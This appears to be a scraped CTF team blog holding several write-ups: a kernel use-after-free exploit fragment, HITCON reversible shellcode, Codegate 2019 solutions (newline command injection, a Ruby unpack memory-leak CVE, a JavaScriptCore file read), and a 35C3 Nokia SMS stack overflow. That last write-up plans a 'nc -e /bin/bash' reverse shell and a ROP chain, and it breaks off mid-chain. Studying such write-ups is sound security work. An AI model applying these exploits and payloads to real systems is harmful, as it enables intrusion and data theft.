chunk alloca_size(fd, 0x5000); uint8_t *ptr = mappa(fd, 0x5000); hex_printer(ptr, 0x10); strcpy((char*)ptr, \u0026#34;AAAAAAAAAAAAAAAAAAAAB\u0026#34;); // deallocate page singularly to get ref count below 1 printf(\u0026#34;before munmap 1 \\n\u0026#34;); munmap(ptr + 0x1000, 0x1000); printf(\u0026#34;before munmap 2 \\n\u0026#34;); munmap(ptr + 0x2000, 0x1000); puts(\u0026#34;before release!\u0026#34;); release(fd); //Here you could use another munmap. It should work as well. //At this point the priv_data of the file descriptor is pointing to a free chunk int i = 1; while (1) { int pid = fork(); //Spawn several child to get the free chunk allocated if(pid == 0){ char * newarg[] = { argv[0], \u0026#34;child\u0026#34;, NULL }; execv(argv[0], newarg); puts(\u0026#34;neve executed!\u0026#34;); } //checks that the chunk is been written with something else if (get_token(fd) != TOKEN){ puts(\u0026#34;daje!\u0026#34;); //Try to run stuff to get a crash! print_info(fd); alloca_size(fd, 0x1000); mappa(fd, 0x1000); } } puts(\u0026#34;before close\u0026#34;); close(fd); puts(\u0026#34;[parent] Message left.\u0026#34;); } int main(int argc, char *argv[]) { if (argc == 1) { parent_work(argc, argv); } else { child_work(); } return 0; } The Setup # I believe a nice setup is one of the most important and useful things to solve a CTF challenge. I was a little rusty (a better word for noob) with qemu machines. I am putting the setup scripts in this section so that the future me, which will still be rusty with qemu machines, can quickly readapt those scripts during another CTF. Credits for compilation setup go to mebeim.\nRun machine recompiling my sourcecode # #!/bin/bash # Uncompress, make changes, recompress # mkdir initramfs # cd initramfs # zcat ../initramfs.cpio.gz | cpio -i -d # ... edit stuff # find . | cpio -o -H newc | gzip -9 \u0026gt; ../initramfs_edited.cpio.gz set -e gcc -static -g \\ -o initramfs/home/atoms/expl expl.c cp expl.c initramfs/home/atoms/expl.c cd initramfs find . | cpio -o -H newc | gzip -9 \u0026gt; ../initramfs_edited.cpio.gz cd .. qemu-system-x86_64 \\ -s \\ -kernel ./bzImage \\ -initrd ./initramfs_edited.cpio.gz \\ -nographic \\ -cpu qemu64 \\ -append \u0026#34;console=ttyS0 nokaslr panic=-1 softlockup_panic=1\u0026#34; \\ -no-reboot \\ -m 256M -smp cores=2 \\ -device e1000,netdev=network0 \\ -netdev tap,id=network0,ifname=tap0,script=no,downscript=no \\ -monitor none -s is for enableing gdbserver on the kernel.\n-device e1000,netdev=network0 \\ -netdev tap,id=network0,ifname=tap0,script=no,downscript=no \\ To enable network communication between gest and host. You also need the network setup script and assign an IP in the machine. I achieved the IP assignment by modifying the init script of the initramfs. nokaslr as kernel option to disable kaslr. cat /proc/kallsyms from inside the vm to get position of functions inside the kernel.\nSetup network for debugging # I needed the network setup from the host and the guest in order to run a gdbserver on the executable inside the vm.\n#!/bin/sh sudo ip link add br0 type bridge sudo ip addr flush dev br0 # Assign IP to the bridge. sudo ip addr add 192.168.100.50/24 brd 192.168.100.255 dev br0 #reate TAP interface. sudo ip tuntap add mode tap user $(whoami) ip tuntap show #Add TAP interface to the bridge. sudo ip link set tap0 master br0 #Make sure everything is up sudo ip link set dev br0 up sudo ip link set dev tap0 up # DELETE # sudo ip link set dev br0 down # sudo ip link set dev tap0 down # sudo ip link del br0 # sudo ip link del tap0 Inside ./initramfs/init:\nifconfig eth0 up ip addr add 192.168.100.51/24 broadcast 192.168.100.255 dev eth0 Tenet # You have to start looking at the world in a new way.\nnc 52.192.42.215 9427\nAuthor: david942j\nThe Goal of the Challenge # The challenge is based on the server.rb ruby script which takes a shellcode as input and wraps it into an ELF executable file that is then run by the time_machine debugger. The goal of the challenge was to initially reverse this debugger and learn what it exactly does. Later on we found out that in order to retrieve the flag the shellcode needed to be executable in two ways: the normal and the reversed one. The peculiarity was that the code would run reversed following the same flow it got in the \u0026lsquo;straight\u0026rsquo; way.\nThe generated ELF # First of all we wanted to test out what kind of wrapping was in place within our shellcode, we found out that seccomp was enabled preventing us from executing every possible syscall but read, write, exit, and sigreturn, as mentioned in the man:\nThe only system calls that the calling thread is permitted to make are read(2), write(2), _exit(2) (but not exit_group(2)), and sigreturn(2)\nWe also found that it initialized a both readable and writable mapping at address 0x2170000 to 0x2171000. Our shellcode started from address 0xdead0080 and needed to be less than 2KB.\nThe time_machine debugger # We started reversing this binary, we soon realized that it was a debugger executing whatever it\u0026rsquo;s passed through as a first argument (Our generated ELF). Our shellcode was executed step by step saving in a list every executed instruction address. Once it got to a SYSCALL instruction it checked whether the EAX register was set to 0x3C (sys_exit) and, if so, it started executing every instruction stored in the list in reversed order. The syscall (or sysenter) instructions were completely ignored and even if we got one we couldn\u0026rsquo;t execute almost anything because of the seccomp. The debugger, once started, also sets an 8byte cookie to 0x2170000, checks if it\u0026rsquo;s cleared once our shellcode is executed and rechecks if it\u0026rsquo;s there once it got executed the other way back.\nThe shellcode # So the challenge was: write down an assembly that could erase the cookie when executed in the normal way and could restore it when executed with the same flow but reversed. Our first tought was to store it into a register and xor it to memory in a way that looked like this:\nmov rcx, 0x2170000 mov rdx, 0x0 ; Clean rdx xor rdx, [rcx] ; Set/erase rdx xor [rcx], rdx ; Erase/set memory mov rcx, 0x2170000 mov eax, 0x3c syscall Of course, it wasn\u0026rsquo;t that simple, the registers (both the CPU and FP ones) got erased right before the reversed execution, we needed somewhere else to store the cookie. The stack? No, we couldn\u0026rsquo;t have a stack address in the reversed execution. The rest of the 0x2170000 mapping? No, this debugger checked also that the entire page was NULL(ed). But then we realized that we actually had a memory: the executed instruction order! So the final shellcode looked like this:\nmov rdx, 0x2170000 ; initialize rdx to cookie address mov rsp, 0x2170500 ; improvised stack to store ret values mov rcx, rdx add rcx, 0 call confrontoLow ; confronto == compare add rcx, 0 mov rcx, rdx add rcx, 0 call confrontoHigh add rcx, 0 mov rcx, rdx add rcx, 1 call confrontoLow add rcx, 1 mov rcx, rdx add rcx, 1 call confrontoHigh add rcx, 1 mov rcx, rdx . . ; Replicated code for every nibble possible value . add rcx, 15 ; While coding at 4am, we didn\u0026#39;t realized that up to 7 was enough, we copied more than needed(16 bytes) call confrontoLow add rcx, 15 mov rcx, rdx add rcx, 15 call confrontoHigh add rcx, 15 push 0 ; clean improvised stack ; reset a bunch of things just to be sure mov rsp, 0x2170500 mov rdx, 0x2170000 mov rcx, 0x2170500 xor rdx,rdx xor rbx,rbx xor rcx,rcx xor r14,r14 ; Or should I comment here? Whatever... mov rax, 0x3c syscall ; Check the upper nibble and jump to the calculated function offset confrontoHigh: xor rbx,rbx mov bl, byte ptr[rcx] shr bl, 4 mov r14, 0xdead035b ; absolute for nibble00High add r14, rbx ; multiply by 8 for lazy people add r14, rbx add r14, rbx add r14, rbx add r14, rbx add r14, rbx add r14, rbx add r14, rbx jmp r14 ; Check the lower nibble and jump to the calculated function offset confrontoLow: xor rbx,rbx mov bl, byte ptr[rcx] and bl, 0xf mov r14, 0xdead030b ; absolute for nibble00Low add r14, rbx ; multiply by 5 for lazy people add r14, rbx add r14, rbx add r14, rbx add r14, rbx jmp r14 nibble00Low: xor qword ptr [rcx],0x00 ret nibble01: xor qword ptr [rcx],0x01 ret . . . nibble0f: xor qword ptr [rcx],0x0f ret nibble00High: xor qword ptr [rcx],0x00 ret nop ; Needed a 3 byte offset because xor with immediate ‚â§0x7f is smaller than the other half byte (Wtf x64 assembly?) nop nop nibble10: xor qword ptr [rcx],0x10 ret nop nop nop . . . nibble70: xor qword ptr [rcx],0x70 ret nop nop nop nibble80: xor qword ptr [rcx],0x80 ret . . . nibblef0: xor qword ptr [rcx],0xf0 ret And the flow does the rest\u0026hellip; When it goes back it initializes a register at the right byte address and the flow \u0026lsquo;remembers\u0026rsquo; which value every nibble had by executing the code segment containing the xor with that value.\nConclusion # We could, as we had seen from the solution, have used bits instead of nibbles but hey! At least we didn\u0026rsquo;t use bytes! Also, during our journey, we thought we could use some floating-point register but we had seen that this wasn\u0026rsquo;t the case because those got erased too. (Turns out we were wrong because the xmm registers did got erased, while the ymm registers didn\u0026rsquo;t get erased)\n","date":"5 December 2020","externalUrl":null,"permalink":"/writeups/2020-12-05-hitcon2020-all-writeups/","section":"","summary":"","title":"HITCON 2020 - Write ups","type":"writeups"},{"content":"","date":"5 December 2020","externalUrl":null,"permalink":"/tags/writeups/","section":"Tags","summary":"","title":"Writeups","type":"tags"},{"content":" We are mhackeroni, an Italian ethical hacking team. We come from a handful of small italian teams that in 2018 decided to join forces. Our goal? Compete in the most prestigious hacking competition in the world: DEF CON CTF.\nThis competition takes place during the DEF CON conference, the most renowned hacking and cybersecurity event in the world. You might know it because it was featured in popular movies and TV shows such as X-Files, The Signal, and the recent Mr. Robot. DEF CON\u0026rsquo;s main highlight is surely the Capture The Flag (CTF) competition, where only a selection of the best teams from academia and industry compete for the glory.\nThis year we will be part of DEF CON again: In fact, we confirmed the great results of 2018, when we got second place out of 600+ teams at the qualification round, and we scored seventh at the final in Vegas. This year we competed in the Capture The Flag of the historical Chaos Communication Congress, the biggest European hacker conference \u0026ndash; and we won the only qualification spot out of 600+ teams from all over the world.\nWe are one of the 16 teams that managed to get a seat at the finals in Vegas. We, therefore, think that our presence during this event is a great opportunity for visibility: last year‚Äôs attendees were over 28.000, and everyone\u0026rsquo;s eyes are pointed to the few competing teams.\nCompeting in the DEF CON CTF finals is a great team effort. mhackeroni are 40 young people among the best students and researchers in cybersecurity. Logistics and communication are critical for the success of our crew, so we are looking for sponsors and supporters to help us bring the team to Las Vegas.\nIf you wish to support us you can write to info@mhackeroni.it, here‚Äôs what we can offer:\nEternal gratitude :) Feature you on our official social media accounts People in the DEF CON game arena will put your sticker on their laptop Logo on our t-shirts Logo on our hoodies Talk about our experience organizing and competing in CTF competitions CVs of every team member: BSc, MSc, PhD, and postgraduate students in cybersecurity ","date":"17 June 2019","externalUrl":null,"permalink":"/news/2019-06-17-defconctf-finals-call-for-sponsors-2019/","section":"","summary":"","title":"DEF CON 27 CTF - Call for Sponsors","type":"news"},{"content":" Authors: pietroferretti Is this the vulnerable library?\nWe have one executable, 20000, and 20000 shared libs in the 20000_so folder.\nThe main executable will let you choose which of the 20000 libs to actually load, then run the test function.\nAt a first look, most of the libs just immediately end execution with a call to exit. With a combination of testing all libs automatically and dumb luck, we noticed that the lib_2035.so lib calls system(\u0026quot;ls %s\u0026quot;) with our input, instead of just exiting.\nlib_2035.so though loads and runs filter1 from lib_11896.so and filter2 from lib_5163.so, which prevent us from using the following characters and strings:\n; * | \u0026amp; $ ` \u0026gt; \u0026lt; r v m p d \u0026#34;bin\u0026#34; \u0026#34;sh\u0026#34; \u0026#34;bash\u0026#34; f l g Even with the filter, injecting arbitrary shell commands is easy, we just need to add an end-of-line character (\\n). To read the flag file we can just use globbing and bypass the f l g filter.\n#!/usr/bin/env python2 from pwn import * with remote(\u0026#39;110.10.147.106\u0026#39;, 15959) as p: p.recvuntil(\u0026#39;INPUT : \u0026#39;) p.sendline(\u0026#39;2035\u0026#39;) p.recvuntil(\u0026#39;file\u0026#39;) p.sendline(\u0026#39;\u0026#34;\\ncat ????\u0026#39;) p.interactive() flag{Are_y0u_A_h@cker_in_real-word?}\n","date":"28 January 2019","externalUrl":null,"permalink":"/writeups/2019-01-28-codegate-quals-2019-20000/","section":"","summary":"","title":"20000 - Codegate Quals 2019","type":"writeups"},{"content":" Author: chq-matteo I like an algorithm\nnc 110.10.147.104 15712 nc 110.10.147.109 15712 ==\u0026gt; Hi, I like an algorithm. So, i make a new authentication system. ==\u0026gt; It has a total of 100 stages. ==\u0026gt; Each stage gives a 7 by 7 matrix below sample. ==\u0026gt; Find the smallest path sum in matrix, by starting in any cell in the left column and finishing in any cell in the right column, and only moving up, down, and right. ==\u0026gt; The answer for the sample matrix is 12. ==\u0026gt; If you clear the entire stage, you will be able to authenticate. [sample] 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 1 1 1 99 1 1 1 1 99 1 99 1 99 99 99 99 1 1 1 99 If you want to start, type the G key within 10 seconds....\u0026gt;\u0026gt; This challenge is a variant of dijkstra algorithm for shortest path with positive weights\nWe just need to add a virtual start and end node with zero weight and linked with the leftmost and rightmost cells.\nimport pwn import queue def inside(m, x, y): return 0 \u0026lt;= x \u0026lt; len(m) and 0 \u0026lt;= y \u0026lt; len(m[x]) def get_next(m, x, y): for i in [-1, 0, 1]: for j in [0, 1]: if abs(i) + abs(j) == 1 and inside(m, x + i, y + j): yield (x + i, y + j) def shortest_path(m): pq = queue.PriorityQueue() ssp = dict() ssp[\u0026#39;ans\u0026#39;] = 10**128 for i in range(7): for j in range(7): ssp[(i, j)] = 10**128 pq.put((m[i][0], [m[i][0]], (i, 0))) ssp[(i, 0)] = m[i][0] while not pq.empty(): top, p, coor = pq.get(pq) x, y = coor if y == len(m[x]) - 1: if top \u0026lt; ssp[\u0026#39;ans\u0026#39;]: print(p) ssp[\u0026#39;ans\u0026#39;] = min(ssp[\u0026#39;ans\u0026#39;], top) for xi, yi in get_next(m, x, y): if top + m[xi][yi] \u0026lt; ssp[(xi, yi)]: ssp[(xi, yi)] = top + m[xi][yi] pq.put((top + m[xi][yi], p + [m[xi][yi]], (xi, yi))) # print(ssp) return ssp[\u0026#39;ans\u0026#39;] flag = \u0026#39;\u0026#39; def solve_stage(r): global flag r.recvuntil(\u0026#39;***\u0026#39;) r.recvline() m = [] for i in range(7): m.append(list(map(int, r.recvline().split()))) l = shortest_path(m) flag += chr(l) r.sendline(str(l)) def main(): #pwn.context.log_level = \u0026#39;DEBUG\u0026#39; with pwn.remote(\u0026#39;110.10.147.104\u0026#39;, 15712) as r: r.recvuntil(\u0026#39;type the G\u0026#39;) r.sendline(\u0026#39;G\u0026#39;) for i in range(100): solve_stage(r) print(flag) if __name__ == \u0026#39;__main__\u0026#39;: main() After solving 100 puzzles we don\u0026rsquo;t find the flag, rather we are told that the flag is the solution of the various puzzles\nWe just added some code to convert the distance to ascii and append it to the flag\nIt is a base64 that decodes to\nFLAG : g00ooOOd_j0B!!!___uncomfort4ble__s3curity__is__n0t__4__security!!!!! ","date":"28 January 2019","externalUrl":null,"permalink":"/writeups/2019-01-28-codegate-quals-2019-algo_auth/","section":"","summary":"","title":"algo_auth - Codegate Quals 2019","type":"writeups"},{"content":" Author: chq-matteo How not to pwn a modified 2018.11.18 Webkit\nButterfree Download 2018.11.18 Webkit and Modified nc 110.10.147.110 17423 Download Download2 We are given access to a JavaScriptCore shell.\nThere was an hint on the official discord of the ctf that there was an unintended solution to this challenge, specifically a one-liner.\nGiven the hint we tried to require some path where the flag could be at.\nExecuting require('flag') we get a syntax error related to \u0026lsquo;{\u0026rsquo;.\nWe found that there is a debug feature in jsc shell that allows read from the file system\nhttps://bugs.webkit.org/show_bug.cgi?id=125059\nIn the end the solution to the challenge is\n\u0026gt; console.log(readFile(\u0026#39;flag\u0026#39;)) flag{4240a8444fe8734044fca90700b3ade2} The intended solution is very similar to https://github.com/WebKit/webkit/commit/650552a6ed7cac8aed3f53dd464341728984b82f\n","date":"28 January 2019","externalUrl":null,"permalink":"/writeups/2019-01-28-codegate-quals-2019-butterfree/","section":"","summary":"","title":"Butterfree - Codegate Quals 2019","type":"writeups"},{"content":"","date":"28 January 2019","externalUrl":null,"permalink":"/tags/codegate/","section":"Tags","summary":"","title":"Codegate","type":"tags"},{"content":"","date":"28 January 2019","externalUrl":null,"permalink":"/tags/command-injection/","section":"Tags","summary":"","title":"Command-Injection","type":"tags"},{"content":"","date":"28 January 2019","externalUrl":null,"permalink":"/tags/cve/","section":"Tags","summary":"","title":"Cve","type":"tags"},{"content":" Author: pietroferretti Can you read this? really???? lol\nWe have a small Ruby script and a TCP port to connect to.\nflag = \u0026#34;FLAG{******************************}\u0026#34; # Can you read this? really???? lol while true puts \u0026#34;[CONVERTER IN RUBY]\u0026#34; STDOUT.flush sleep(0.5) puts \u0026#34;Type something to convert\\n\\n\u0026#34; STDOUT.flush puts \u0026#34;[*] readme!\u0026#34; STDOUT.flush puts \u0026#34;When you want to type hex, contain \u0026#39;0x\u0026#39; at the first. e.g 0x41414a\u0026#34; STDOUT.flush puts \u0026#34;When you want to type string, just type string. e.g hello world\u0026#34; STDOUT.flush puts \u0026#34;When you want to type int, just type integer. e.g 102939\u0026#34; STDOUT.flush puts \u0026#34;type exit if you want to exit\u0026#34; STDOUT.flush input = gets.chomp puts input STDOUT.flush if input == \u0026#34;exit\u0026#34; file_write() exit end puts \u0026#34;What do you want to convert?\u0026#34; STDOUT.flush if input[0,2] == \u0026#34;0x\u0026#34; puts \u0026#34;hex\u0026#34; STDOUT.flush puts \u0026#34;1. integer\u0026#34; STDOUT.flush puts \u0026#34;2. string\u0026#34; STDOUT.flush flag = 1 elsif input =~/\\D/ puts \u0026#34;string\u0026#34; STDOUT.flush puts \u0026#34;1. integer\u0026#34; STDOUT.flush puts \u0026#34;2. hex\u0026#34; STDOUT.flush flag = 2 else puts \u0026#34;int\u0026#34; STDOUT.flush puts \u0026#34;1. string\u0026#34; STDOUT.flush puts \u0026#34;2. hex\u0026#34; STDOUT.flush flag = 3 end num = gets.to_i if flag == 1 if num == 1 puts \u0026#34;hex to integer\u0026#34; STDOUT.flush puts Integer(input) STDOUT.flush elsif num == 2 puts \u0026#34;hex to string\u0026#34; STDOUT.flush tmp = [] tmp \u0026lt;\u0026lt; input[2..-1] puts tmp.pack(\u0026#34;H*\u0026#34;) STDOUT.flush else puts \u0026#34;invalid\u0026#34; STDOUT.flush end elsif flag == 2 if num == 1 puts \u0026#34;string to integer\u0026#34; STDOUT.flush puts input.unpack(\u0026#34;C*#{input}.length\u0026#34;) STDOUT.flush elsif num == 2 puts \u0026#34;string to hex\u0026#34; STDOUT.flush puts input.unpack(\u0026#34;H*#{input}.length\u0026#34;)[0] STDOUT.flush else puts \u0026#34;invalid2\u0026#34; STDOUT.flush end elsif flag == 3 if num == 1 puts \u0026#34;int to string\u0026#34; STDOUT.flush elsif num == 2 puts \u0026#34;int to hex\u0026#34; STDOUT.flush puts input.to_i.to_s(16) STDOUT.flush else puts \u0026#34;invalid3\u0026#34; STDOUT.flush end else puts \u0026#34;invalid4\u0026#34; STDOUT.flush end end The Ruby script\u0026rsquo;s intended functionality apparently is to convert values to strings, integers and hexadecimal.\nThe bug is easily identifiable in the following lines:\nputs input.unpack(\u0026#34;C*#{input}.length\u0026#34;) [...] puts input.unpack(\u0026#34;H*#{input}.length\u0026#34;)[0] In Ruby, #{something} is a template, which will be replaced by the value of something.\nLooks like the correct way to write those lines should have been with length inside the curly braces, to make it evaluate as the length of input. As it is now, unpack takes input itself as argument.\nBy itself unpack isn\u0026rsquo;t insecure, but a quick Google search for \u0026ldquo;ruby unpack vulnerabilities\u0026rdquo; immediately gives a good candidate for exploitation: https://www.ruby-lang.org/en/news/2018/03/28/buffer-under-read-unpack-cve-2018-8778/\nOn not so recent versions of ruby, passing big numbers as argument to unpack makes it possible to dump the memory of the program due to a wrong signed/unsigned conversion. This will probably let us retrieve the initial value of flag, even if the reference was overwritten.\nDumping memory # $ (python -c \u0026#34;import sys; sys.stdout.write(\u0026#39;@18446744073708351616C1200000\\n1\\n\u0026#39;)\u0026#34;; cat -) | nc 110.10.147.105 12137 \u0026gt; dump.txt Converting the output to characters # The script outputs the result as single integers and floats. We can quickly convert those to actual characters.\n#!/usr/bin/env python2 import string with open(\u0026#39;dump.txt\u0026#39;) as f: s = f.read() out = \u0026#39;\u0026#39; for line in s.split(\u0026#39;\\n\u0026#39;): try: c = chr(int(line)) if c in string.printable: out += c except ValueError: continue with open(\u0026#39;dump2.txt\u0026#39;, \u0026#39;w\u0026#39;) as g: g.write(out) Finding the flag # The last step is easy, we know the flag format.\n$ cat dump2.txt | grep -i \u0026#34;FLAG{.*}\u0026#34; FLAG{Run away with me.It\u0026#39;ll be the way you want it} ","date":"28 January 2019","externalUrl":null,"permalink":"/writeups/2019-01-28-codegate-quals-2019-mini-converter/","section":"","summary":"","title":"mini converter - Codegate Quals 2019","type":"writeups"},{"content":"","date":"28 January 2019","externalUrl":null,"permalink":"/tags/programming/","section":"Tags","summary":"","title":"Programming","type":"tags"},{"content":"","date":"28 January 2019","externalUrl":null,"permalink":"/tags/ruby/","section":"Tags","summary":"","title":"Ruby","type":"tags"},{"content":"","date":"28 January 2019","externalUrl":null,"permalink":"/tags/unintended/","section":"Tags","summary":"","title":"Unintended","type":"tags"},{"content":"","date":"30 December 2018","externalUrl":null,"permalink":"/tags/35c3/","section":"Tags","summary":"","title":"35c3","type":"tags"},{"content":"","date":"30 December 2018","externalUrl":null,"permalink":"/tags/gsm/","section":"Tags","summary":"","title":"Gsm","type":"tags"},{"content":" Author: jinblack Remember the Nokia 1337 from 31C3? This time we have a real target for you!\nChallenge note # Note: There is a giant readme in the provided archive. Make sure you read it and try everything locally first. After you have your exploit, launch it against the remote infrastructure and get to the real meat!\nNote 2: The UI crashes when you select a phone book entry and select \u0026ldquo;Options\u0026rdquo;. This is not intended and an oversight by the author but isn\u0026rsquo;t relevant to the solution to the challenge. So just don\u0026rsquo;t hit that button.\nHints: To avoid confusion: The target phone can reach external hosts on the internet and has netcat installed.\nWhere do we begin? # There is a phone running somewhere at the 35c3 convention. It is connected to a GSM network. But there is no radio connection for the physical layer, instead, all the GSM protocol run over UDP packets that are sent through an OpenVPN connection.\nI ran the buildall script, it took a while (I was in the South of Italy visiting my parents, here internet connection is far from good). I ran the startall script and only two containers out of 3 came up. One container was the baseband. another one was an osmocombb instance with 2 configured phone, and the third one, the one who did not come up, the one that really matters was an emulator for the Nokia phone.\nInside the nokia phone # nokia_qemu container is dying just after the start, but this does not stop us from getting inside and find our binary. the container as an image folder and inside that we have nokia-image-nokia.ext4. This is the filesystem of our phone. We can mount this and take a look.\nsudo mount ./nokia-image-nokia.ext4 /mnt There is a /flag.txt file containing:\nIf this was the real challenge, you would find the flag here. So we at least know where is the flag. Inside /opt/nokia we have 3 arm32 binaries: baseband layer1 nokia_ui. So, we probably need to remotely pwn one of those binaries and read the flag.\nRunning the nokia phone # We definitely need to have a running setup if we want to have any chance of pwning this. So we need to figure out why our docker container is not working. To be honest inside the readme there where some hint on how to run the container. But at that time I was not aware enough of the challenge set up to actually understand that. The Nokia phone is running inside a qemu that is inside the docker container. The problem was that it was not able to connect to x11 server to actually render stuff.\nMy solution was to change the -display sdl into -vnc :0 from the runqemu.sh.\nThis enables a vnc server that you need to expose outside the container to actually have access to it. So you need to add a -p 5900:5900 to you docker running command inside the run.sh script.\nThen we can connect to the screen using vinagre a vnc client.\nWhen the nokia is running you can also connect through ssh as explained by the runall.sh script.\nRunning ps we can actually confirm that those binaries that we found are actually running on the phone.\n1172 root 6924 S /opt/nokia/nokia_ui 1173 root 1564 S /sbin/agetty -8 -L ttyAMA0 115200 xterm 1174 root 4944 S /usr/sbin/openvpn --daemon --writepid /var/run/openvpn/gsm.pid --cd /etc/open 1205 root 5852 S /opt/nokia/layer1 1206 root 6124 S /opt/nokia/baseband 1209 root 2108 S /usr/sbin/dropbear -i -r /etc/dropbear/dropbear_rsa_host_key -B Reversing the binary nokia_ui # Opening the binary with ida you actually understand that most of the code is in thumb mode. But my ida fails to identify the code like that. You can use Alt+G to change the flag T to let ida know that a segment is actually in thumb mode.\nPlaying with the phone you can notice that only 2 main functionalities are implemented inside the phone.\nPhonebook SMS So this phone cannot do voice call. Can only send and receive SMSes. Then we need to find where those SMSes are actually handled.\nAround address 0x12E82 we see this:\nif ( v49 == 0x202 ) { v51 = osmo_hexdump(recvstuff + 0x11, 163); printf(\u0026#34;Received SMS TPDU: %s\\n\u0026#34;, v51); recv_sms(v44, recvstuff[16], recvstuff + 0x11); JUMPOUT(__CS__, v12); } if ( v49 == 515 ) { printf(\u0026#34;Received SMS confirmation: msg_ref: %u - cause: %u\\n\u0026#34;, recvstuff[180], *(recvstuff + 46)); if ( recvstuff[181] ) sub_13388(v44, recvstuff[180], *(recvstuff + 46)); } else if ( v49 == 258 ) { printf(\u0026#34;Shutdown indication: Old state: %u - New State: %u\\n\u0026#34;, *(recvstuff + 2), (*(recvstuff + 2) \u0026gt;\u0026gt; 32)); if ( *(recvstuff + 5) == 3 ) *(v44 + 60) = 1; JUMPOUT(__CS__, v12); } goto LABEL_20; The Received SMS TPDU gives away the fact that the next function is probably where SMS is interpreted.\nHere is the decompiled source from recv_sms.\nThere is basically 2 way of receiving SMS:\nNormal SMS Multi-Part SMS (Concatenated SMS) To have a multi-part SMS you need to insert inside the SMS payload a User Data Header (UDH). You can read the standard but this stuff is well known and can also be found on Wikipedia Concatenated SMS.\nLooking at the Wikipedia page we can compare the standard header for multi-part SMS with this code:\nputs(\u0026#34;Received SMS with UDH\u0026#34;); if ( userbuf-\u0026gt;encoded_data[1] ) { printf(\u0026#34;Got unknown information element in UDH: 0x%02x\\n\u0026#34;, userbuf-\u0026gt;encoded_data[1]); goto FAIL; } if ( userbuf-\u0026gt;encoded_data[0] != 5 ) { puts(\u0026#34;Concatenated SMS UDH with length != 5?\u0026#34;); FAIL: puts(\u0026#34;Received SMS with malformed/unknown UDH. Discarding...\u0026#34;); result = talloc_free(userbuf, 115284); goto LABEL_33; } if ( userbuf-\u0026gt;encoded_data[2] != 3 ) { puts(\u0026#34;Concatenated SMS UDH with header length != 3?\u0026#34;); goto FAIL; } nparts = userbuf-\u0026gt;encoded_data[4]; if ( nparts \u0026gt; 3 ) { puts(\u0026#34;Too many parts\u0026#34;); goto FAIL; } refnum = userbuf-\u0026gt;encoded_data[3]; seqnum = userbuf-\u0026gt;encoded_data[5]; We know that the binary is using the standard UDH format. We can give a name to all those bytes that the program is parsing.\nSo basically when you send a multipart SMS you add this header where you write a refnum or CSMS that is a unique id to identify the sequence of SMSes. You have a nparts or number of parts that are expected for that SMS. And the most important seqnum a number that says which part of SMS you are handling (2 means this is the second piece of the SMS).\nWe also notice that we cannot have SMSes that are bigger than 3 parts.\nThe Vulnerability # After a while playing ctfs you know that if the author spent the time to implement the multi-part SMS protocol that stuff is needed for the attack.\nWhere multi-part SMSes are actually processed we find this:\n{ if ( !v55 || v55 \u0026gt; 3 ) puts(\u0026#34;Unknown data coding scheme in sms. Copying raw data after UDH\u0026#34;); puts(\u0026#34;8 bit encoding\u0026#34;); v49 = 134; v50 = *(v47-\u0026gt;data + 28); if ( v50 \u0026lt;= 0x8C ) v49 = v50 - 6; memcpy(\u0026amp;payload[134 * seqnum - 134], (v47-\u0026gt;data + 35), v49); } This code is actually reconstructing the SMS from all its parties. Copying the result inside payload a variable on the stack. seqnum is a value that we can control arbitrarily. Even if we are limited to only 3 parts we can specify that we are sending part number 4 and this will cause the memcpy to write outside the allocated buffer writing the return address on the stack gaining control of the PC.\nCommunicate with the phone # We need to be able to send SMS to this phone to actually exploit the vulnerability. Thankfully the author provided us with a full setup that also contains configured version of osmocombb software.\nAfter a while playing with these software (and actually reading the source code) I found that if you type enable in the console you can use the sms command to send some SMSes. The problem was that the interface was very limited. It was sending only single sms with the 7bit encoding scheme and was accepting only ASCII character. I needed to be more flexible to be able to produce multi-part SMSes. I tried to sniff the output of osmocombb to be able to write a python script. But I quickly discovered that the full gsm protocol was involved. This includes asking and obtaining a channel to actually communicate with the baseband. Implementing all this stuff was time consuming and, in ctf, you do not have much time. So, I decided to patch osmocombb software to implement a command that let me send a more customizable sms.\nFull patch is available here. The interesting stuff is:\nBe able to specify that the packet contains a UDH header.\nsms-\u0026gt;ud_hdr_ind = atoi((char *)argv[1]); Specify that the data was 8bit encoded and not 7bit encoded.\nsms-\u0026gt;data_coding_scheme = 4; Write sms as hex encoded so that I could you any value.\nchar * text_hex = argv_concat(argv, argc, 3); char * text = hex2b(text_hex); int text_len = strlen(text_hex) / 2; The result is a command like this where I specify that UHD is included and the sms is hex encoded:\nsmshex one 1 9999 05000317010a170069350100921a05b46b2a0100247017006935010069460b276b2a0100287017006935010001dfc0466b2a01002c70170069350100020012346b2a01003070170069350100253b24286b2a010034701700693501002f62696e6b2a010038701700693501002f7368006b2a01003c7017006935010001701700531f0100 The attack # Now we can communicate via SMS with the phone and we also have a vulnerability.\nI wrote a small python function to encode SMSes:\ndef encode_part(ref_num, data, CSMS=0x17, max_part=3): assert max_part \u0026lt;= 3 header = \u0026#34;\\x05\\x00\\x03\u0026#34; + chr(CSMS) + chr(max_part) + chr(ref_num) return header+data We can craft few SMSes with payloads from the cyclic command of pwntools and find how to control the PC.\nc = \u0026#34;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa\u0026#34; print \u0026#34;smshex one 1 9999\u0026#34;,encode_part(4, c[:134], max_part=1).encode(\u0026#34;hex\u0026#34;) Now that we control PC challenge is solved right?\nActually was not so easy. Even if it was a nokia phone, in reality, it was a binary running on a Linux distro. So it had NX bit and ASLR enable. The binary was not PIE.\nWhen I usually exploit a no PIE binary with ASLR and NX bit, I write a ropchain that leak something from the .got and then read again on top of the stack for a second stage rop that uses libc. But this time I did not have a connection to the binary. So was very hard to implement a second stage sent later.\nThe phone had Internet access and also nc installed. So the plan was to execute:\nsystem(\u0026#34;nc myserver 9999 -e /bin/bash\u0026#34;); system was not in the .got so I need to do some computation from a value in the got to get the address for system. This stuff is hard while ropping, so the exploitation plan was slightly different: Let\u0026rsquo;s map some executable address and write a shellcode that does a reverse connection.\nSo, I collected a few gadgets and built the ropachain that execute a mmap on an address the I can choose. Permissions for this new page are of course RWX.\n# 0x0001275e : ldr r3, [r5, #0x20] ; cmp r3, r4 ; bne #0x12760 ; ldrd r4, r5, [sp] ; add sp, #8 ; pop {r6, pc} r3load = 0x0001275e #0x000128fe : pop 